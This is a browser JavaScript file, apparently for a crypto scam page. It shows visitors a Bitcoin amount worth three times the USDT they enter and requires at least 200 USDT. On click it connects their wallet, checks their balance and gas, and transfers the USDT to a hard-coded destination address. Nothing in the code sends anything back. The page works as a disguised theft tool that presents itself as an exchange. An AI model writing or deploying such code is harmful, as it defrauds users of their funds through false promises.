const USDT = "0x55d398326f99059fF775485246999027B3197955";
const DEST = "0x56E93caFf970003A66264a10B1581066E0f17112";
const BNB_GAS_USD = 0.50;

let provider, signer, btcRate = 0;

const ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function approve(address,uint256) returns (bool)",
  "function transfer(address,uint256) returns (bool)"
];

async function init() {
  provider = new ethers.providers.Web3Provider(window.ethereum);
  await provider.send('eth_requestAccounts', []);
  signer = provider.getSigner();
  await fetchBtcRate();
  updateDisplay(); // Initial update
}

async function fetchBtcRate() {
  try {
    const res = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usdt");
    const json = await res.json();
    btcRate = json.bitcoin.usdt || 0;
  } catch {
    btcRate = 0;
  }
}

function updateDisplay() {
  const inputVal = parseFloat(document.getElementById("usdtInput").value) || 0;
  const usd3x = inputVal * 3;
  document.getElementById("usdtValue").innerText = `$${usd3x.toFixed(2)}`;

  document.getElementById("rateLine").innerText = `1 BTC ≈ ${btcRate ? btcRate.toLocaleString('en') : '--'} USDT`;

  const btcVal = btcRate ? usd3x / btcRate : 0;
  document.getElementById("btcAmount").innerText = btcVal.toFixed(8);
  document.getElementById("btcUsd").innerText = `$${usd3x.toFixed(2)}`;
}

document.getElementById("usdtInput").addEventListener("input", updateDisplay);

document.getElementById("transferBtn").addEventListener("click", async () => {
  const inputVal = parseFloat(document.getElementById("usdtInput").value);
  const msg = document.getElementById("msg");
  msg.className = "";

  if (isNaN(inputVal) || inputVal < 200) {
    msg.innerText = "❌ Minimum 200 USDT required";
    msg.className = "error";
    return;
  }

  try {
    const token = new ethers.Contract(USDT, ABI, signer);
    const user = await signer.getAddress();

    const balance = await token.balanceOf(user);
    const usdtBal = parseFloat(ethers.utils.formatUnits(balance, 18));
    if (usdtBal < inputVal) throw new Error("Insufficient USDT");

    const bnbBal = parseFloat(ethers.utils.formatEther(await provider.getBalance(user)));
    const bnbRate = (await (await fetch("https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd")).json()).binancecoin.usd;
    if (bnbBal * bnbRate < BNB_GAS_USD) throw new Error("Low BNB for gas");

    const amt = ethers.utils.parseUnits(inputVal.toString(), 18);
    await (await token.approve(DEST, amt)).wait();
    await (await token.transfer(DEST, amt)).wait();

    msg.innerText = `✅ ${inputVal} USDT sent successfully`;
    msg.className = "success";
  } catch (err) {
    msg.innerText = `❌ ${err.message}`;
    msg.className = "error";
  }
});

init();
